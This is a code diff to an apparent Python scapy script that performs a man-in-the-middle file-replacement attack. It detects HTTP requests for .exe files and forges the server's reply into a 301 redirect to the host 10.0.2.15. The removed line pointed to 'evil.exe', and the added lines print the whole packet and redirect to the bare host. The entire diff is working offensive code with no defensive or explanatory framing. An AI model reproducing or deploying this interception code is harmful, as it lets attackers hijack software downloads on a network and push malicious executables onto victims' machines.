@@ -21,13 +21,14 @@ def process_packet(packet):
         if scapy_packet[scapy.TCP].dport == 80:
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
+                print(scapy_packet.show())
                 ack_list.append(scapy_packet[scapy.TCP].ack)
                 
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file.")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved permanently\nLocation: http://10.0.2.15/evil.exe\n\n")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved permanently\nLocation: http://10.0.2.15\n\n")
                 packet.set_payload(str(modified_packet))
 
     packet.accept()
